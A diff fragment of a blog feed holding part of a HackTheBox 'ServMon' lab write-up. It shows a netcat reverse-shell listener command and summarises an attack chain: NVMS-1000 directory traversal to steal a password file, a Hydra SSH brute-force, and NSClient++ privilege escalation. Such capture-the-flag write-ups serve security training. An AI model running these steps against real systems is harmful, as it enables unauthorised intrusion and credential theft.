+&lt;p&gt;Before performing &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 5&lt;/code&gt; from the previous section, we need to create a listener at our attacking machine. Below is the command used to use for getting a reverse shell:&lt;/p&gt;
 
 &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ nc -lvnp &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -380,7 +519,7 @@
 
 &lt;p&gt;As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.&lt;/p&gt;
 
-&lt;p&gt;For me, the key takeways was services discovered via nmap also runs on localhost in the target machine. As explained above, &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; web portal was unstable and hence, we had to attack via command line against localhost.&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="HTB" /><summary type="html">Brief     On enumerating different services of ServMon machine, we were able to find few confidentails files from FTP service which discloses a hint saying that list of password is stored in Nathan uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. NVMS-1000. On assessing the software, it was vulnerable to Directory Traversal vulnerability which helps us to conquer the Passwords.txt from Nathan's desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( Nathan and Nadine ), we try to brute force the available SSH service on target machine using Hydra. On the conclusion of brute forcing, we were able to find credentails of nadine and taking leverage of it, we ssh to the machine using nadine cracked password and get proof.txt. Once we got the local access, enumeration helped us to find NSClient++ running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get root.txt.</summary></entry><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/learning/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/learning/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/learning/2020/06/10/Mobile-Security/">&lt;style&gt;
+&lt;p&gt;For me, the key takeway was services discovered via nmap also runs on localhost in the target machine. As explained above, &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; web portal was unstable and hence, we had to attack via command line against localhost.&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="HTB" /><summary type="html">Brief     On enumerating different services of ServMon machine, we were able to find few confidentail files from FTP service which disclosed a hint saying that a file consisting of passwords being stored in Nathan users desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. NVMS-1000. Assessing the software, it was vulnerable to Directory Traversal vulnerability which helped us to conquer the Passwords.txt from Nathan's desktop by using exploit available on exploit-db.As we have got a list of passsword and two usersnames ( Nathan and Nadine ), we try to brute force the available SSH service on target machine using Hydra. Brute Forcing helped us to find credentails of nadine and taking leverage of it, we ssh’ed to the machine using nadine cracked password and get user.txt. Once we got the local access, enumeration helped us to find NSClient++ running and on exploitation of it using publicly available script, we were able to get maximum level of privelege and get root.txt.</summary></entry><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/learning/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/learning/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/learning/2020/06/10/Mobile-Security/">&lt;style&gt;
 * {
   box-sizing: border-box;
 }
